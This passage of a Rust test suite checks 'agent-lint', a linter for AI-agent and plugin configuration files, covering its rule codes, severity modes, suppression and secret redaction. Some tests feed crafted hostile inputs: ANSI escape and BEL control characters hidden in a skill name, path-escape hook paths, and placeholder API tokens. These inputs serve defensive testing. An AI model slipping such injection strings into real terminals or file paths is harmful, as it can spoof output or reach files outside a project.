        "[lint]\nsuppress = [\"CX035\"]\n",
    )
    .unwrap();
    assert!(
        run_in(tmp.path(), &["--format", "json", "--only", "CX035", "."])
            .status
            .success()
    );
    assert_eq!(
        run_in(
            tmp.path(),
            &["--format", "json", "--all", "--only", "CX035", "."]
        )
        .status
        .code(),
        Some(1)
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".codex/config.toml\"]\nsuppress = [\"CX035\"]\n",
    )
    .unwrap();
    assert!(
        run_in(tmp.path(), &["--format", "json", "--only", "CX035", "."])
            .status
            .success()
    );
    assert_eq!(
        run_in(
            tmp.path(),
            &["--format", "json", "--all", "--only", "CX035", "."]
        )
        .status
        .code(),
        Some(1)
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nexclude = [\".codex/**\"]\n",
    )
    .unwrap();
    assert!(
        run_in(
            tmp.path(),
            &["--format", "json", "--all", "--only", "CX027,CX035", "."]
        )
        .status
        .success()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[platforms]\ncodex = false\n",
    )
    .unwrap();
    assert!(
        run_in(tmp.path(), &["--format", "json", "--only", "CX027", "."])
            .status
            .success()
    );
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[platforms]\ncodex = true\n",
    )
    .unwrap();
    assert_eq!(
        run_in(tmp.path(), &["--format", "json", "--only", "CX027", "."])
            .status
            .code(),
        Some(1)
    );

    std::fs::remove_file(tmp.path().join("agent-lint.toml")).unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"example"}"#,
    )
    .unwrap();
    let plugin = run_in(tmp.path(), &["--format", "json", "--only", "CX027", "."]);
    assert_eq!(plugin.status.code(), Some(1));
    assert_eq!(json(&plugin)["mode"], "plugin");

    let _ = run_in(tmp.path(), &["--autofix", "--only", "CX027,CX035", "."]);
    assert_eq!(std::fs::read_to_string(config_path).unwrap(), config);
}

#[test]
fn cx060_cli_covers_modes_platform_policy_locations_and_autofix() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".agents/skills/example/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    let original = "---\nname: example\ndescription: Example Codex skill\ncontext: fork\n\"agent\": Explore\n---\nBody\n";
    std::fs::write(&skill, original).unwrap();
    std::fs::create_dir(tmp.path().join(".codex")).unwrap();
    std::fs::write(tmp.path().join(".codex/config.toml"), "model = \"gpt-5\"\n").unwrap();

    for arguments in [
        vec!["--format", "json", "--only", "CX060", "."],
        vec!["--format", "json", "--pedantic", "--only", "CX060", "."],
        vec!["--format", "json", "--all", "--only", "CX060", "."],
    ] {
        let output = run_in(tmp.path(), &arguments);
        let report = json(&output);
        let diagnostics = report["diagnostics"].as_array().unwrap();
        assert_eq!(diagnostics.len(), 2, "{report}");
        assert_eq!(diagnostics[0]["code"], "CX060");
        assert_eq!(diagnostics[0]["name"], "codex-skill-frontmatter");
        assert_eq!(
            diagnostics[0]["subject_path"],
            ".agents/skills/example/SKILL.md"
        );
        assert_eq!(diagnostics[0]["location"]["start"]["line"], 4);
        assert_eq!(diagnostics[0]["location"]["start"]["column"], 1);
        assert_eq!(diagnostics[0]["evidence"], "context (string)");
        assert_eq!(diagnostics[1]["evidence"], "agent (string)");
        assert_eq!(diagnostics[1]["location"]["start"]["line"], 5);
        let elevated = arguments.contains(&"--all") || arguments.contains(&"--pedantic");
        let severity = if elevated { "error" } else { "warning" };
        assert_eq!(diagnostics[0]["severity"], severity);
        assert_eq!(
            output.status.code(),
            Some(if elevated { 1 } else { 0 }),
            "stderr: {}",
            stderr(&output)
        );
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[platforms]\ncodex = false\n",
    )
    .unwrap();
    assert!(
        run_in(tmp.path(), &["--format", "json", "--only", "CX060", "."])
            .status
            .success()
    );
    assert!(
        json(&run_in(
            tmp.path(),
            &["--format", "json", "--only", "CX060", "."]
        ))["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[platforms]\ncodex = true\n",
    )
    .unwrap();
    assert_eq!(
        json(&run_in(
            tmp.path(),
            &["--format", "json", "--only", "CX060", "."]
        ))["diagnostics"]
            .as_array()
            .unwrap()
            .len(),
        2
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".agents/skills/example/SKILL.md\"]\nsuppress = [\"CX060\"]\n",
    )
    .unwrap();
    assert!(
        json(&run_in(
            tmp.path(),
            &["--format", "json", "--only", "CX060", "."]
        ))["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert_eq!(
        json(&run_in(
            tmp.path(),
            &["--format", "json", "--all", "--only", "CX060", "."]
        ))["diagnostics"]
            .as_array()
            .unwrap()
            .len(),
        2
    );

    std::fs::remove_file(tmp.path().join("agent-lint.toml")).unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"example","description":"Plugin mode surface."}"#,
    )
    .unwrap();
    let plugin = run_in(tmp.path(), &["--format", "json", "--only", "CX060", "."]);
    assert_eq!(plugin.status.code(), Some(0));
    assert_eq!(json(&plugin)["mode"], "plugin");
    assert_eq!(json(&plugin)["diagnostics"].as_array().unwrap().len(), 2);

    let _ = run_in(tmp.path(), &["--autofix", "--only", "CX060", "."]);
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), original);
}

#[test]
fn cx013_cli_is_precise_across_modes_suppression_and_plugin_dispatch() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".codex")).unwrap();
    let secret = "sk-abcdefghijklmnopqrstuvwxyz";
    let server = "sk-abcdefghijklmnopqrstuv";
    let config = format!(
        "[mcp_servers.{server}]\ncommand = 'server'\nenv = {{ API_KEY = '${{GITHUB_TOKEN}}', ORDINARY = '{secret}' }}\n"
    );
    let config_path = tmp.path().join(".codex/config.toml");
    std::fs::write(&config_path, &config).unwrap();

    for arguments in [
        vec!["--format", "json", "--only", "CX013", "."],
        vec!["--format", "json", "--pedantic", "--only", "CX013", "."],
        vec!["--format", "json", "--all", "--only", "CX013", "."],
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        let report = json(&output);
        let diagnostics = report["diagnostics"].as_array().unwrap();
        assert_eq!(diagnostics.len(), 1);
        let diagnostic = &diagnostics[0];
        assert_eq!(diagnostic["code"], "CX013");
        assert_eq!(diagnostic["severity"], "error");
        assert_eq!(diagnostic["subject_path"], ".codex/config.toml");
        assert_eq!(diagnostic["evidence"], "ORDINARY");
        assert_eq!(diagnostic["location"]["start"]["line"], 3);
        assert!(
            diagnostic["suggestion"]
                .as_str()
                .unwrap()
                .contains("env_vars")
        );
        let serialized = report.to_string();
        assert!(!serialized.contains(secret));
        assert!(!serialized.contains(server));
    }

    let text = run_in(tmp.path(), &["--only", "CX013", "."]);
    let text = stderr(&text);
    assert!(!text.contains(secret));
    assert!(!text.contains(server));

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"CX013\"]\n",
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--format", "json", "--only", "CX013", "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert_eq!(json(&suppressed)["counts"]["suppressed"], 1);
    assert_eq!(
        run_in(
            tmp.path(),
            &["--format", "json", "--all", "--only", "CX013", "."]
        )
        .status
        .code(),
        Some(1)
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".codex/config.toml\"]\nsuppress = [\"CX013\"]\n",
    )
    .unwrap();
    assert!(
        run_in(tmp.path(), &["--format", "json", "--only", "CX013", "."])
            .status
            .success()
    );

    std::fs::remove_file(tmp.path().join("agent-lint.toml")).unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"example"}"#,
    )
    .unwrap();
    let plugin = run_in(tmp.path(), &["--format", "json", "--only", "CX013", "."]);
    assert_eq!(plugin.status.code(), Some(1));
    assert_eq!(json(&plugin)["mode"], "plugin");

    let _ = run_in(tmp.path(), &["--autofix", "--only", "CX013", "."]);
    assert_eq!(std::fs::read_to_string(config_path).unwrap(), config);
}

#[test]
fn inline_path_rules_share_clean_normalized_and_fence_aware_behavior() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join("docs")).unwrap();
    std::fs::write(tmp.path().join("docs/README.md"), "present\n").unwrap();
    std::fs::write(tmp.path().join("Node.js"), "present\n").unwrap();
    std::fs::write(tmp.path().join("api.example.com"), "present\n").unwrap();
    for directory in [".claude", ".github", ".vscode", ".devcontainer"] {
        std::fs::create_dir(tmp.path().join(directory)).unwrap();
    }
    std::fs::write(
        tmp.path().join("AGENTS.md"),
        "# Instructions\n\
         See `docs/README.md#usage` and `docs/README.md::entry`.\n\
         Use `Node.js`, `api.example.com`, `.claude`, `.github`, `.vscode`, and `.devcontainer`.\n\
         Python `3.12`, `1.2.3`, and `v20.11.1` use `.properties` files.\n\
         ```\n\
         docs/missing-only-in-fence.md\n\
         ```\n",
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "I003,D005", "."],
    );
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    assert_eq!(json(&output)["diagnostics"], serde_json::json!([]));
}

#[test]
fn inline_path_marker_is_documented_as_d005_only() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("AGENTS.md"),
        "See `docs/missing.md`. <!-- lint-doc-pointer-paths: ok legacy generated path -->\n",
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "I003,D005", "."],
    );
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let diagnostics = json(&output)["diagnostics"].as_array().unwrap().clone();
    assert_eq!(diagnostics.len(), 1);
    assert_eq!(diagnostics[0]["code"], "I003");
    assert_eq!(diagnostics[0]["evidence"], "docs/missing.md");
}

#[test]
fn plugin_hook_declarations_load_all_surfaces_with_their_real_subjects() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let manifest = tmp.path().join(".claude-plugin/plugin.json");
    std::fs::create_dir_all(manifest.parent().unwrap()).unwrap();

    std::fs::write(&manifest, r#"{"name":"hooks-test"}"#).unwrap();
    let output = run_in(tmp.path(), &["--format", "json", "--only", "H001", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    assert_eq!(json(&output)["diagnostics"], serde_json::json!([]));

    std::fs::write(
        &manifest,
        r#"{"name":"hooks-test","hooks":"./config/missing.json"}"#,
    )
    .unwrap();
    let output = run_in(tmp.path(), &["--format", "json", "--only", "H001", "."]);
    let report = json(&output);
    assert_eq!(output.status.code(), Some(1), "{report:#}");
    assert_eq!(
        report["diagnostics"][0]["subject_path"],
        "config/missing.json"
    );

    std::fs::create_dir_all(tmp.path().join("config")).unwrap();
    std::fs::write(tmp.path().join("config/one.json"), "{").unwrap();
    std::fs::write(tmp.path().join("config/two.json"), "{").unwrap();
    std::fs::write(
        &manifest,
        r#"{"name":"hooks-test","hooks":["./config/one.json","./config/two.json"]}"#,
    )
    .unwrap();
    let output = run_in(tmp.path(), &["--format", "json", "--only", "H002", "."]);
    let report = json(&output);
    let subjects = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
        .collect::<std::collections::BTreeSet<_>>();
    assert_eq!(
        subjects,
        ["config/one.json", "config/two.json"].into_iter().collect()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = ["config/one.json", "config/two.json"]
suppress = ["H002"]
"#,
    )
    .unwrap();
    let output = run_in(tmp.path(), &["--format", "json", "--only", "H002", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    assert_eq!(json(&output)["diagnostics"], serde_json::json!([]));
    std::fs::remove_file(tmp.path().join("agent-lint.toml")).unwrap();

    std::fs::write(
        &manifest,
        r#"{"name":"hooks-test","hooks":{"PreToolUse":[{"hooks":[{"command":"${CLAUDE_PLUGIN_ROOT}/scripts/missing.sh"}]}]}}"#,
    )
    .unwrap();
    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "H004,H010", "."],
    );
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 2, "{report:#}");
    assert!(diagnostics.iter().any(|diagnostic| {
        diagnostic["code"] == "H004" && diagnostic["subject_path"] == "scripts/missing.sh"
    }));
    assert!(diagnostics.iter().any(|diagnostic| {
        diagnostic["code"] == "H010" && diagnostic["subject_path"] == ".claude-plugin/plugin.json"
    }));

    std::fs::write(&manifest, r#"{"name":"hooks-test","hooks":{}}"#).unwrap();
    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "H003,H007", "."],
    );
    let report = json(&output);
    assert_eq!(
        report["diagnostics"].as_array().unwrap().len(),
        1,
        "{report:#}"
    );
    assert_eq!(report["diagnostics"][0]["code"], "H007");
    assert_eq!(
        report["diagnostics"][0]["subject_path"],
        ".claude-plugin/plugin.json"
    );
}

#[test]
fn hooks_json_non_collection_values_are_h026_not_h003_or_h007() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let manifest = tmp.path().join(".claude-plugin/plugin.json");
    std::fs::create_dir_all(manifest.parent().unwrap()).unwrap();
    std::fs::write(&manifest, r#"{"name":"hooks-test"}"#).unwrap();
    std::fs::create_dir_all(tmp.path().join("hooks")).unwrap();

    for value in ["null", "\"x\"", "42"] {
        std::fs::write(
            tmp.path().join("hooks/hooks.json"),
            format!(r#"{{"hooks":{value}}}"#),
        )
        .unwrap();
        let output = run_in(
            tmp.path(),
            &["--format", "json", "--only", "H003,H007,H026", "."],
        );
        let report = json(&output);
        let diagnostics = report["diagnostics"].as_array().unwrap();
        assert_eq!(diagnostics.len(), 1, "{report:#}");
        assert_eq!(diagnostics[0]["code"], "H026");
        assert_eq!(diagnostics[0]["subject_path"], "hooks/hooks.json");
    }
}

#[test]
fn plugin_hook_declaration_shapes_use_h026_with_structured_manifest_locations() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let manifest = tmp.path().join(".claude-plugin/plugin.json");
    std::fs::create_dir_all(manifest.parent().unwrap()).unwrap();

    std::fs::write(
        &manifest,
        r#"{
  "name": "hooks-test",
  "hooks": ["", 42, null, false, {}, []]
}"#,
    )
    .unwrap();
    let output = run_in(
        tmp.path(),
        &[
            "--format",
            "json",
            "--only",
            "H001,H003,H007,H026,M013",
            ".",
        ],
    );
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 6, "{report:#}");
    assert!(diagnostics.iter().all(|diagnostic| {
        diagnostic["code"] == "H026"
            && diagnostic["subject_path"] == ".claude-plugin/plugin.json"
            && diagnostic["location"].is_object()
    }));
    assert!(diagnostics.iter().all(|diagnostic| {
        diagnostic["evidence"]
            .as_str()
            .is_some_and(|evidence| !evidence.is_empty())
    }));

    for declaration in ["\"\"", "\".\"", "\"./\"", "\"././.\""] {
        std::fs::write(
            &manifest,
            format!(r#"{{"name":"hooks-test","hooks":{declaration}}}"#),
        )
        .unwrap();
        let output = run_in(
            tmp.path(),
            &[
                "--format",
                "json",
                "--only",
                "H001,H003,H007,H026,M013",
                ".",
            ],
        );
        let report = json(&output);
        assert_eq!(
            report["diagnostics"].as_array().unwrap().len(),
            1,
            "{report:#}"
        );
        assert_eq!(report["diagnostics"][0]["code"], "H026");
    }

    std::fs::write(
        &manifest,
        r#"{"name":"hooks-test","hooks":"./config/missing.json"}"#,
    )
    .unwrap();
    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "H001,H026", "."],
    );
    let report = json(&output);
    assert_eq!(
        report["diagnostics"].as_array().unwrap().len(),
        1,
        "{report:#}"
    );
    assert_eq!(report["diagnostics"][0]["code"], "H001");

    std::fs::write(
        &manifest,
        r#"{"name":"hooks-test","hooks":["/absolute.json","../escape.json"]}"#,
    )
    .unwrap();
    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "H026,M013", "."],
    );
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 2, "{report:#}");
    assert!(
        diagnostics
            .iter()
            .all(|diagnostic| diagnostic["code"] == "M013")
    );
}

#[test]
fn userconfig_rules_cover_modes_focus_suppression_and_exclude_boundary() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{
          "name": "p",
          "userConfig": {
            "hyphen-key": {"type": "enum", "title": "T", "description": "D"},
            "token": {"type": "string", "title": "Token", "description": "Desc", "extra": true}
          },
          "channels": [{
            "server": "slack",
            "userConfig": {
              "nested_bad": {
                "type": "bogus",
                "title": 42,
                "description": false,
                "sensitive": "yes"
              }
            }
          }],
          "mcpServers": {"slack": {"command": "slack-server"}}
        }"#,
    )
    .unwrap();
    std::fs::create_dir_all(tmp.path().join("scripts")).unwrap();
    std::fs::write(
        tmp.path().join("scripts/unused.sh"),
        "# CLAUDE_PLUGIN_OPTION_TOKEN\necho hi\n",
    )
    .unwrap();

    let only = "U001,U002,U004,U005,U006,U007,U008";

    let basic_tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(basic_tmp.path().join(".claude")).unwrap();
    std::fs::write(basic_tmp.path().join(".claude/settings.json"), "{}").unwrap();
    let basic = run_in(basic_tmp.path(), &["--format", "json", "--only", only, "."]);
    assert!(basic.status.success(), "stderr: {}", stderr(&basic));
    assert_eq!(json(&basic)["diagnostics"], serde_json::json!([]));

    let normal = run_in(tmp.path(), &["--format", "json", "--only", only, "."]);
    assert_eq!(normal.status.code(), Some(1), "stderr: {}", stderr(&normal));
    let diagnostics = json(&normal)["diagnostics"].as_array().unwrap().clone();
    assert!(!diagnostics.is_empty(), "{diagnostics:#?}");
    for diagnostic in &diagnostics {
        assert_eq!(diagnostic["subject_path"], ".claude-plugin/plugin.json");
        assert!(diagnostic["evidence"].is_string(), "{diagnostic:#}");
        assert!(diagnostic["suggestion"].is_string(), "{diagnostic:#}");
        assert_ne!(diagnostic["code"], "U003");
    }
    let codes: Vec<_> = diagnostics
        .iter()
        .map(|d| d["code"].as_str().unwrap())
        .collect();
    for required in ["U002", "U004", "U005", "U006", "U007", "U008"] {
        assert!(codes.contains(&required), "missing {required}: {codes:?}");
    }

    let focused = run_in(tmp.path(), &["--format", "json", "--only", "U007", "."]);
    let focused_report = json(&focused);
    let focused_codes: Vec<_> = focused_report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| d["code"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(focused_codes, vec!["U007".to_string()]);

    let pedantic = run_in(
        tmp.path(),
        &["--format", "json", "--pedantic", "--only", only, "."],
    );
    assert_eq!(pedantic.status.code(), Some(1));
    assert!(
        !json(&pedantic)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"U007\", \"U006\", \"U005\", \"U002\", \"U004\", \"U008\"]\n",
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--format", "json", "--only", only, "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert_eq!(json(&suppressed)["diagnostics"], serde_json::json!([]));
    assert!(json(&suppressed)["counts"]["suppressed"].as_u64().unwrap() >= 1);

    let all_mode = run_in(
        tmp.path(),
        &["--format", "json", "--all", "--only", only, "."],
    );
    assert_eq!(all_mode.status.code(), Some(1));
    assert!(
        !json(&all_mode)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".claude-plugin/plugin.json\"]\nsuppress = [\"U007\", \"U006\", \"U005\", \"U002\", \"U004\", \"U008\"]\n",
    )
    .unwrap();
    let per_file = run_in(tmp.path(), &["--format", "json", "--only", only, "."]);
    assert!(per_file.status.success(), "stderr: {}", stderr(&per_file));
    assert_eq!(json(&per_file)["diagnostics"], serde_json::json!([]));

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nexclude = [\".claude-plugin/plugin.json\"]\n",
    )
    .unwrap();
    let excluded = run_in(tmp.path(), &["--format", "json", "--only", only, "."]);
    assert_eq!(
        excluded.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&excluded)
    );
    assert!(
        !json(&excluded)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty(),
        "fixed-path userConfig rules must ignore [lint].exclude"
    );

    std::fs::write(tmp.path().join(".claude-plugin/plugin.json"), "{").unwrap();
    let malformed = run_in(
        tmp.path(),
        &["--format", "json", "--only", "M002,U006", "."],
    );
    let malformed_report = json(&malformed);
    let malformed_codes: Vec<_> = malformed_report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| d["code"].as_str().unwrap())
        .collect();
    assert_eq!(malformed_codes, vec!["M002"]);
}

#[test]
fn u009_userconfig_default_secret_modes_privacy_and_suppression() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    let manifest = tmp.path().join(".claude-plugin/plugin.json");
    let secret = "xoxb-1clishouldnotecho";
    let broken = serde_json::json!({
        "name": "p",
        "userConfig": {
            "botToken": {
                "type": "string", "title": "Bot token", "description": "Slack bot token",
                "sensitive": true, "default": secret
            }
        }
    })
    .to_string();
    std::fs::write(&manifest, &broken).unwrap();

    // Normal mode: U009 is a warning, so a lone U009 exits 0.
    let normal = run_in(tmp.path(), &["--format", "json", "--only", "U009", "."]);
    assert_eq!(normal.status.code(), Some(0), "stderr: {}", stderr(&normal));
    let diagnostics = json(&normal)["diagnostics"].as_array().unwrap().clone();
    assert_eq!(diagnostics.len(), 1, "{diagnostics:#?}");
    assert_eq!(diagnostics[0]["code"], "U009");
    assert_eq!(diagnostics[0]["severity"], "warning");
    assert_eq!(diagnostics[0]["subject_path"], ".claude-plugin/plugin.json");
    assert_eq!(diagnostics[0]["evidence"], "/userConfig/botToken/default");
    // The default value never appears in any output channel.
    assert!(!String::from_utf8_lossy(&normal.stdout).contains(secret));
    assert!(!stderr(&normal).contains(secret));

    // Pedantic and all promote U009 to an error (exit 1) and still never echo.
    for mode in ["--pedantic", "--all"] {
        let promoted = run_in(
            tmp.path(),
            &["--format", "json", mode, "--only", "U009", "."],
        );
        assert_eq!(
            promoted.status.code(),
            Some(1),
            "{mode}: {}",
            stderr(&promoted)
        );
        assert_eq!(json(&promoted)["diagnostics"][0]["severity"], "error");
        assert!(!String::from_utf8_lossy(&promoted.stdout).contains(secret));
        assert!(!stderr(&promoted).contains(secret));
    }

    // A sensitive option without a default and a benign default stay clean.
    let clean = serde_json::json!({
        "name": "p",
        "userConfig": {
            "apiToken": {"type": "string", "title": "API token", "description": "Token", "sensitive": true},
            "retry": {"type": "number", "title": "Retries", "description": "Count", "default": 3}
        }
    })
    .to_string();
    std::fs::write(&manifest, &clean).unwrap();
    let clean_run = run_in(tmp.path(), &["--format", "json", "--only", "U009", "."]);
    assert!(clean_run.status.success(), "stderr: {}", stderr(&clean_run));
    assert_eq!(json(&clean_run)["diagnostics"], serde_json::json!([]));

    // Restore the broken manifest for suppression checks.
    std::fs::write(&manifest, &broken).unwrap();

    // Global suppression silences U009 and counts it as suppressed.
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"U009\"]\n",
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--format", "json", "--only", "U009", "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert_eq!(json(&suppressed)["diagnostics"], serde_json::json!([]));
    assert!(json(&suppressed)["counts"]["suppressed"].as_u64().unwrap() >= 1);

    // Per-file override suppresses U009 for the fixed-path manifest.
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".claude-plugin/plugin.json\"]\nsuppress = [\"U009\"]\n",
    )
    .unwrap();
    let per_file = run_in(tmp.path(), &["--format", "json", "--only", "U009", "."]);
    assert!(per_file.status.success(), "stderr: {}", stderr(&per_file));
    assert_eq!(json(&per_file)["diagnostics"], serde_json::json!([]));

    // Basic mode (no plugin manifest) is silent for U009.
    let basic_tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(basic_tmp.path().join(".claude")).unwrap();
    std::fs::write(basic_tmp.path().join(".claude/settings.json"), "{}").unwrap();
    let basic = run_in(
        basic_tmp.path(),
        &["--format", "json", "--only", "U009", "."],
    );
    assert!(basic.status.success(), "stderr: {}", stderr(&basic));
    assert_eq!(json(&basic)["diagnostics"], serde_json::json!([]));
}

#[test]
fn human_readable_output_escapes_control_characters_from_skill_names() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".agents/skills/ansi-test/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    // YAML double-quoted escapes: \e = ESC, \a = BEL (decoded into the name).
    std::fs::write(
        &skill,
        "---\nname: \"evil\\e[31mred\\abell\"\ndescription: Use when testing control character echoing in output\n---\nBody\n",
    )
    .unwrap();

    let text = run_in(tmp.path(), &["--only", "S006,S010", "."]);
    assert_eq!(text.status.code(), Some(1), "stderr: {}", stderr(&text));
    let stderr_bytes = text.stderr.clone();
    let stderr_text = stderr(&text);
    assert!(
        stderr_text.contains(r"\u{1b}"),
        "expected ESC escape in stderr: {stderr_text}"
    );
    assert!(
        stderr_text.contains(r"\u{7}"),
        "expected BEL escape in stderr: {stderr_text}"
    );
    assert!(
        !stderr_bytes.contains(&0x1b),
        "raw ESC must not appear in human-readable stderr"
    );
    assert!(
        !stderr_bytes.contains(&0x07),
        "raw BEL must not appear in human-readable stderr"
    );

    let text_again = run_in(tmp.path(), &["--only", "S006,S010", "."]);
    assert_eq!(text.stderr, text_again.stderr);

    let json_output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "S006,S010", "."],
    );
    assert_eq!(
        json_output.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&json_output)
    );
    let report = json(&json_output);
    let messages: Vec<&str> = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|diagnostic| diagnostic["message"].as_str().unwrap())
        .collect();
    assert!(
        messages.iter().any(|message| message.contains('\u{1b}')),
        "JSON must retain the original ESC byte in message text: {report}"
    );
    assert!(
        messages.iter().any(|message| message.contains('\u{7}')),
        "JSON must retain the original BEL byte in message text: {report}"
    );
}

#[test]
fn unused_override_text_path_escapes_control_characters_in_reason() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\"missing.md\"]\nsuppress = [\"M001\"]\nreason = \"stale\\u001bexception\"\n",
    )
    .unwrap();

    let text = run_in(tmp.path(), &["."]);
    assert!(text.status.success(), "stderr: {}", stderr(&text));
    let stderr_text = stderr(&text);
    assert!(
        stderr_text.contains("config/unused-override"),
        "stderr: {stderr_text}"
    );
    assert!(
        stderr_text.contains(r"\u{1b}"),
        "expected ESC escape in unused-override stderr: {stderr_text}"
    );
    assert!(
        !text.stderr.contains(&0x1b),
        "raw ESC must not appear in unused-override stderr"
    );

    let json_output = run_in(tmp.path(), &["--format", "json", "."]);
    assert!(json_output.status.success());
    let report = json(&json_output);
    let notice = report["notices"][0]["message"].as_str().unwrap();
    assert!(
        notice.contains('\u{1b}'),
        "JSON unused-override notice must retain the original control character: {report}"
    );
    assert!(
        !notice.contains(r"\u{1b}"),
        "JSON unused-override notice must not use Rust-style escapes: {report}"
    );
}

#[test]
fn l006_cli_flags_fenced_npm_run_with_metadata_and_modes() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("package.json"),
        r#"{"name":"demo","scripts":{"test":"echo hi"}}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("CLAUDE.md"),
        "```bash\nnpm run missing-fenced\n```\n\n```json\n{\"scripts\":{\"nope\":\"x\"}}\n```\n\nDo not run npm run also-missing.\n\n`npm --workspace pkg run workspace-only`\n",
    )
    .unwrap();

    let normal = run_in(tmp.path(), &["--format", "json", "--only", "L006", "."]);
    assert!(normal.status.success(), "stderr: {}", stderr(&normal));
    let report = json(&normal);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1, "{report:#}");
    let diagnostic = &diagnostics[0];
    assert_eq!(diagnostic["code"], "L006");
    assert_eq!(diagnostic["severity"], "warning");
    assert_eq!(diagnostic["subject_path"], "CLAUDE.md");
    assert_eq!(diagnostic["evidence"], "missing-fenced");
    assert_eq!(
        diagnostic["suggestion"],
        "add this script to the root package.json or correct the command"
    );
    assert_eq!(diagnostic["location"]["start"]["line"], 2);
    assert!(
        diagnostic["message"]
            .as_str()
            .unwrap()
            .contains("missing-fenced")
    );

